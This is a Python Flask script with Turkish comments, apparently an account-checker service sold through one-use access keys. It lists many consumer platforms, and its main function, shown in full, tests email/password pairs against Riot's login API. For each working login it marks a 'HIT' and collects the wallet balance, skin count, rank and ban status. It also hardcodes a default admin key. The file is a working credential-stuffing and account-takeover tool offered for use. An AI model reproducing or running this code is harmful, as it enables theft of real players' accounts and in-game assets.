#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Roda - API Discovery + Checker (Türkçe)
Render Disk ile kalıcı key'ler | PUBG + VALORANT (GERÇEK) | Loglar (Admin)
"""

import os, json, re, time, random, string, threading, webbrowser, base64
from datetime import datetime, timedelta
from urllib.parse import urljoin, urlparse, parse_qs
import requests
from flask import Flask, request, jsonify, Response

app = Flask(__name__)
app.secret_key = os.urandom(24)

# ============================================================
# MASTER KEY (GİZLENDİ - ENV'DEN ALIYOR)
# ============================================================
MASTER_KEY = os.environ.get("RODA_MASTER_KEY", "Roda@2026#Secure!X7")
if MASTER_KEY == "Roda@2026#Secure!X7":
    print("⚠️ UYARI: Varsayılan master key kullanılıyor! RODA_MASTER_KEY ortam değişkenini ayarlayın.")

KEYS_FILE = "/data/keys.json"
if not os.path.exists("/data"):
    KEYS_FILE = "keys.json"

# ============================================================
# LOG SİSTEMİ (SADECE ADMIN GÖRÜR)
# ============================================================
LOGS = []
MAX_LOGS = 1000

def add_log(message, level="INFO"):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    LOGS.append({"timestamp": timestamp, "level": level, "message": message})
    if len(LOGS) > MAX_LOGS:
        LOGS.pop(0)
    print(f"[{timestamp}] [{level}] {message}")

# ============================================================
# KEY FONKSİYONLARI (1 KEY 1 KİŞİ - KULLANILINCA SİLİNİR)
# ============================================================
def load_keys():
    if os.path.exists(KEYS_FILE):
        with open(KEYS_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    return {}

def save_keys(data):
    os.makedirs(os.path.dirname(KEYS_FILE), exist_ok=True)
    with open(KEYS_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2, ensure_ascii=False)

def is_key_valid(key):
    if key == MASTER_KEY:
        return True, "Admin"
    keys = load_keys()
    if key in keys:
        entry = keys[key]
        exp = entry.get("expires")
        if exp:
            if datetime.now() < datetime.fromisoformat(exp):
                # 1 key 1 kişi - kullanıldıktan sonra sil
                del keys[key]
                save_keys(keys)
                return True, entry.get("note", "Kullanıcı")
            else:
                del keys[key]
                save_keys(keys)
        else:
            # Süresiz key de 1 kullanımlık olsun
            del keys[key]
            save_keys(keys)
            return True, entry.get("note", "Kullanıcı")
    return False, None

def is_admin(key):
    valid, role = is_key_valid(key)
    return valid and role == "Admin"

# ============================================================
# PLATFORMLAR
# ============================================================
PLATFORMS = [
    {"name": "YouTube", "domain": "youtube.com", "icon": "fa-brands fa-youtube"},
    {"name": "TikTok", "domain": "tiktok.com", "icon": "fa-brands fa-tiktok"},
    {"name": "Spotify", "domain": "spotify.com", "icon": "fa-brands fa-spotify"},
    {"name": "Roblox", "domain": "roblox.com", "icon": "fa-solid fa-gamepad"},
    {"name": "Netflix", "domain": "netflix.com", "icon": "fa-solid fa-film"},
    {"name": "CapCut", "domain": "capcut.com", "icon": "fa-solid fa-scissors"},
    {"name": "Discord", "domain": "discord.com", "icon": "fa-brands fa-discord"},
    {"name": "Epic Games", "domain": "epicgames.com", "icon": "fa-solid fa-crown"},
    {"name": "Hesapcomtr", "domain": "hesap.com.tr", "icon": "fa-solid fa-user"},
    {"name": "Itemsatış", "domain": "itemsatis.com", "icon": "fa-solid fa-cart-shopping"},
    {"name": "Epinify", "domain": "epinify.com", "icon": "fa-solid fa-ticket"},
    {"name": "Twitch", "domain": "twitch.tv", "icon": "fa-brands fa-twitch"},
    {"name": "Steam", "domain": "steampowered.com", "icon": "fa-brands fa-steam"},
    {"name": "PlayStation", "domain": "playstation.com", "icon": "fa-solid fa-play"},
    {"name": "Xbox", "domain": "xbox.com", "icon": "fa-brands fa-xbox"},
    {"name": "GitHub", "domain": "github.com", "icon": "fa-brands fa-github"},
    {"name": "Valorant", "domain": "valorant.com", "icon": "fa-solid fa-crosshairs"},
    {"name": "Minecraft", "domain": "minecraft.net", "icon": "fa-solid fa-cube"},
    {"name": "Duolingo", "domain": "duolingo.com", "icon": "fa-solid fa-language"},
    {"name": "PUBG", "domain": "pubg.com", "icon": "fa-solid fa-crosshairs"},
]

# ============================================================
# VALORANT CHECKER (DÜZELTİLDİ - GERÇEK API)
# ============================================================
def check_valorant_account(email, password):
    session = requests.Session()
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': 'application/json, text/plain, */*',
        'Content-Type': 'application/json'
    })
    result = {
        "status": "ERROR",
        "details": {
            "level": "?",
            "vp": "?",
            "rp": "?",
            "skins": "?",
            "rank": "?",
            "banned": "?",
            "puuid": "?",
            "riot_id": "?",
            "region": "?"
        },
        "message": ""
    }
    try:
        # 1. DOĞRU Authorize - GET ile
        auth_url = "https://auth.riotgames.com/authorize"
        params = {
            "redirect_uri": "http://localhost/redirect",
            "client_id": "riot-client",
            "response_type": "token id_token",
            "nonce": "1",
            "scope": "openid link ban account email mobile_number",
            "claims": '{"userinfo":{"ban":null,"acct":null,"email_verified":null,"country":null}}'
        }
        r = session.get(auth_url, params=params, timeout=10)
        if r.status_code != 200:
            result["status"] = "BAD"
            result["message"] = "Authorize başarısız"
            return result

        # 2. Login - PUT ile (aynı)
        r = session.put("https://auth.riotgames.com/api/v1/authorization", json={
            "type": "auth",
            "username": email,
            "password": password,
            "remember": False
        }, timeout=10)
        if r.status_code != 200:
            result["status"] = "BAD"
            result["message"] = "Sunucu hatası"
            return result
        data = r.json()
        if "error" in data:
            if "multifactor" in str(data):
                result["status"] = "2FA"
                result["message"] = "2FA gerekli"
                return result
            result["status"] = "BAD"
            result["message"] = data.get("error", "Giriş reddedildi")
            return result

        # 3. Access Token al
        if "response" in data and "parameters" in data["response"]:
            uri = data["response"]["parameters"]["uri"]
            if "access_token=" in uri:
                token = uri.split("access_token=")[1].split("&")[0]
                session.headers.update({"Authorization": f"Bearer {token}"})
            else:
                result["status"] = "BAD"
                result["message"] = "Token alınamadı"
                return result
        else:
            result["status"] = "BAD"
            result["message"] = "Token alınamadı"
            return result

        # 4. User Info
        r = session.get("https://auth.riotgames.com/userinfo", timeout=10)
        if r.status_code == 200:
            ui = r.json()
            result["details"]["puuid"] = ui.get("sub", "")
            result["details"]["riot_id"] = ui.get("acct", {}).get("game_name", "") + "#" + ui.get("acct", {}).get("tag_line", "")
            result["details"]["email"] = ui.get("email", "")

        # 5. Entitlements Token
        r = session.post("https://entitlements.auth.riotgames.com/api/token/v1", json={}, timeout=10)
        if r.status_code == 200:
            ent = r.json()
            if ent.get("entitlements_token"):
                session.headers.update({"X-Riot-Entitlements-JWT": ent["entitlements_token"]})

        # 6. Bölge
        region = "eu"
        try:
            r = session.get("https://riot-geo.pas.si.riotgames.com/pas/v1/service/valorant", timeout=10)
            if r.status_code == 200:
                region = r.json().get("affinity", "eu")
        except:
            pass
        result["details"]["region"] = region

        puuid = result["details"]["puuid"]
        if not puuid:
            result["status"] = "BAD"
            result["message"] = "PUUID alınamadı"
            return result

        # 7. Level
        try:
            r = session.get(f"https://pd.{region}.a.pvp.net/account-xp/v1/players/{puuid}", timeout=10)
            if r.status_code == 200:
                result["details"]["level"] = r.json().get("progress", {}).get("level", "?")
        except:
            pass

        # 8. Wallet (VP & RP)
        try:
            r = session.get(f"https://pd.{region}.a.pvp.net/store/v1/wallet/{puuid}", timeout=10)
            if r.status_code == 200:
                w = r.json()
                result["details"]["vp"] = w.get("Balances", {}).get("85ad13f7-3d1b-5128-9eb2-7cd8ee0b5741", "0")
                result["details"]["rp"] = w.get("Balances", {}).get("e59aa87c-4cbf-517a-5983-6e81511be9b7", "0")
        except:
            pass

        # 9. Skin Sayısı
        try:
            r = session.get(f"https://pd.{region}.a.pvp.net/store/v1/entitlements/{puuid}/e7c63390-eda7-46e0-bb7a-a6abdacd2433", timeout=10)
            if r.status_code == 200:
                result["details"]["skins"] = len(r.json().get("Entitlements", []))
        except:
            pass

        # 10. Rank
        try:
            r = session.get(f"https://pd.{region}.a.pvp.net/mmr/v1/players/{puuid}", timeout=10)
            if r.status_code == 200:
                mmr = r.json()
                ranked = mmr.get("QueueSkills", {}).get("competitive", {})
                if ranked:
                    seasons = ranked.get("SeasonalInfoBySeasonID", {})
                    if seasons:
                        first = list(seasons.values())[0]
                        result["details"]["rank"] = first.get("CompetitiveTier", "?")
        except:
            pass

        # 11. Ban kontrolü
        try:
            r = session.get("https://riot-geo.pas.si.riotgames.com/restrictions/v3/player", timeout=10)
            if r.status_code == 200:
                result["details"]["banned"] = "Evet" if r.json().get("restrictions") else "Hayır"
        except:
            pass

        result["status"] = "HIT"
        result["message"] = "Giriş başarılı"
        add_log(f"Valorant HIT: {email} | Bölge:{region} Level:{result['details']['level']} VP:{result['details']['vp']} Skin:{result['details']['skins']}", "SUCCESS")

    except Exception as e:
        result["status"] = "ERROR"
        result["message"] = str(e)
        add_log(f"Valorant hata: {email} - {str(e)}", "ERROR")

    return result

# ... (kategorizasyon, extract, proxy, scanner, flask route'ları aynen devam eder)
# HTML de aynen (yeşilimsi mavi tema, 2 mod ayrıştırma, valo detay, vs.)
